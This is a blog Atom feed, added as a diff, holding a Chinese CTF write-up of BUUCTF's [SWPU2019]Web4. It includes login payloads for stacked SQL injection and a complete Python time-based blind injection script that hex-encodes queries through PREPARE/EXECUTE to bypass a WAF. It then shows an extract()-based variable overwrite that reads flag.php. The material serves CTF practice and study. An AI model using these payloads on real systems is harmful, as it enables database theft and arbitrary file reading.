@@ -1,0 +1,240 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;pdo堆叠注入&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-09-06T06:29:46.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <category term="CRLF" />
+    <category term="任意文件读取" />
+    <category term="PDO堆叠注入" />
+    <category term="test" />
+    <category term="tag2" />
+    <entry>
+        <id>http://odiws.github.io/2024/09/06/SWPU2019-Web4/</id>
+        <title>[SWPU2019]Web4</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/09/06/SWPU2019-Web4/"/>
+        <content type="html">&lt;h2 id=&#34;swpu2019web4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web4&#34;&gt;#&lt;/a&gt; [SWPU2019]Web4&lt;/h2&gt;
+&lt;p&gt;考点：PDO 场景下的堆叠注入、时间盲注&lt;/p&gt;
+&lt;p&gt;打开题目叫你登录，不过任凭你怎么登录都会没有反应，注册说 “未开放注册功能”&lt;/p&gt;
+&lt;p&gt;回头一抓包，发现我们向  &lt;code&gt;/index.php?r=Login/Login&lt;/code&gt;  发送了一个数据包，这里可以注入，POST 输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面会报错，但是我们输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面却没报错，同时说密码错误；&lt;/p&gt;
+&lt;p&gt;那么说明这道题可以堆叠注入。&lt;/p&gt;
+&lt;p&gt;尝试  &lt;code&gt;1&#39;;show databases;&lt;/code&gt;  之类的操作，一直显示密码错误，猜测可能关键字被 waf 了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是 PDO），使用预编译 + 16 进制编码绕过 waf。&lt;/p&gt;
+&lt;p&gt;而且页面不会根据我们输入情况回显不同，那么就用时间盲注；&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# by wh1sper
+# 时间盲注
+import requests
+import time
+ 
+host = &#39;http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login&#39;
+ 
+ 
+def mid(bot, top):
+    return (int)(0.5 * (top + bot))
+ 
+def char_to_hex(str):
+    res = &#39;&#39;
+    for i in str:
+        res += hex(ord(i))
+    res = &#39;0x&#39; + res.replace(&#39;0x&#39;, &#39;&#39;)
+    return res
+ 
+ 
+def sqli():
+    name = &#39;&#39;
+    for j in range(1, 250):
+        top = 126
+        bot = 32
+        while 1:
+            #babyselect = &#39;database()&#39;#---&amp;gt;ctf
+            #babyselect = &#39;(select group_concat(table_name) &#39; \
+            #             &#39;from information_schema.tables where table_schema=database())&#39;#---flag
+            # babyselect = &#39;(select group_concat(column_name) &#39; \
+            #             &#39;from information_schema.columns where table_name=&#39;flag&#39;)&#39;#---&amp;gt;flag
+            babyselect = &#39;(select flag from flag)&#39;#---&amp;gt;glzjin_wants_a_girl_friend.zip
+            select = &amp;quot;select if((ascii(substr(&amp;quot; +babyselect+ &amp;quot;,&amp;#123;&amp;#125;,1))&amp;gt; &amp;#123;&amp;#125;),sleep(3),1);&amp;quot;\
+                .format(j, mid(bot, top))
+            playload = &amp;quot;1&#39;;set @a=&amp;quot;+ char_to_hex(select) +&amp;quot;;PREPARE test from @a;execute test;&amp;quot;
+ 
+            data = &amp;#123;
+                &amp;quot;username&amp;quot;: playload,
+                &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;
+            &amp;#125;
+            print(mid(bot, top))
+            start_time = time.time()
+            r = requests.post(url=host, json=data)
+            end_tmie = time.time()
+            #print(r.text)
+            if end_tmie - start_time &amp;gt; 1.5:  # 成功
+                if top - 1 == bot:  # top和bot相邻，说明name是top
+                    name += chr(top)
+                    print(name)
+                    break
+                bot = mid(bot, top)  # 成功就上移bot
+            else:  # 失败
+                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)  # 失败就下移top
+ 
+ 
+if __name__ == &#39;__main__&#39;:
+    sqli()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到：glzjin_wants_a_girl_friend.zip&lt;/p&gt;
+&lt;p&gt;然后看的出来是个文件，访问下载之，得到网站源码。 很明显，我们要通过某种方法将 flag.php 中的文件内容给读取出来。&lt;/p&gt;
+&lt;p&gt;这是个 MVC 模型，首先了解一下该框架下 url 的解析过程：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从 r 参数中获取要访问的  &lt;code&gt;Controller&lt;/code&gt;  以及  &lt;code&gt;Action&lt;/code&gt;  , 然后以  &lt;code&gt;/&lt;/code&gt;  分隔开后拼接成完整的控制器名。 以  &lt;code&gt;Login/Index&lt;/code&gt;  为例，就是将  &lt;code&gt;Login/Index&lt;/code&gt;  分隔开分别拼接成  &lt;code&gt;LoginController&lt;/code&gt;  以及  &lt;code&gt;actionIndex&lt;/code&gt;  , 然后调用  &lt;code&gt;LoginController&lt;/code&gt;  这个类中的  &lt;code&gt;actionIndex&lt;/code&gt;  方法。每个  &lt;code&gt;action&lt;/code&gt;  里面会调用对应的  &lt;code&gt;loadView()&lt;/code&gt;  方法进行模版渲染，然后将页面返回给客户端。 若访问的  &lt;code&gt;Controller&lt;/code&gt;  不存在则默认解析  &lt;code&gt;Login/Index&lt;/code&gt;  。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这样我们就应该先来审计控制器的代码。&lt;/p&gt;
+&lt;p&gt;不难发现，在 BaseController 中有着这么一段明显有问题的代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function loadView($viewName =&#39;&#39;, $viewData = [])
+&amp;#123;
+    $this-&amp;gt;viewPath = BASE_PATH . &amp;quot;/View/&amp;#123;$viewName&amp;#125;.php&amp;quot;;
+    if(file_exists($this-&amp;gt;viewPath))
+    &amp;#123;
+        extract($viewData);
+        include $this-&amp;gt;viewPath;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段代码中使用了  &lt;code&gt;extract()&lt;/code&gt;  ，以及包含了  &lt;code&gt;/View/&amp;#123;$viewName&amp;#125;.php&lt;/code&gt;  ，也就是说我们能通过  &lt;code&gt;$viewName&lt;/code&gt;  和  &lt;code&gt;$viewData&lt;/code&gt;  这两个变量来更改  &lt;code&gt;/View&lt;/code&gt;  下任何一个 php 文件的任何一个变量的值。&lt;/p&gt;
+&lt;p&gt;在 UserController 中找到了以下代码:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function actionIndex()
+&amp;#123;
+    $listData = $_REQUEST;
+    $this-&amp;gt;loadView(&#39;userIndex&#39;,$listData);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看出来，其中  &lt;code&gt;$listData&lt;/code&gt;  是从请求中获取，用户可控，而其对应的  &lt;code&gt;/View/userIndex.php&lt;/code&gt;  中存在一个文件读取：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;fakeimg&amp;quot;&amp;gt;&amp;lt;?php
+    if(!isset($img_file)) &amp;#123;
+        $img_file = &#39;/../favicon.ico&#39;;
+    &amp;#125;
+    $img_dir = dirname(__FILE__) . $img_file;
+    $img_base64 = imgToBase64($img_dir);
+    echo &#39;&amp;lt;img src=&amp;quot;&#39; . $img_base64 . &#39;&amp;quot;&amp;gt;&#39;;       //图片形式展示
+    ?&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中  &lt;code&gt;imgToBase64()&lt;/code&gt;  实现的是将目标文件转化成 base64 格式。而我们只需要将  &lt;code&gt;$img_file&lt;/code&gt;  改成  &lt;code&gt;/flag.php&lt;/code&gt;  即可。&lt;/p&gt;
+&lt;p&gt;访问  &lt;code&gt;http://ip/index.php?r=User/Index&amp;amp;img_file=/../flag.php&lt;/code&gt;  即可获得 flag 的 base64&lt;/p&gt;
+&lt;p 51ca227a-c6d5-4515-bed7-abdea8385e8a=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL3N3cHUyMDE5LSVFNSVBNCU4RCVFNyU4RSVCMC8=&#34;&gt;https://blog.wh1sper.com/posts/swpu2019 - 复现 /&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="PDO堆叠注入" />
+        <updated>2024-09-06T06:29:46.000Z</updated>
+    </entry>
+</feed>
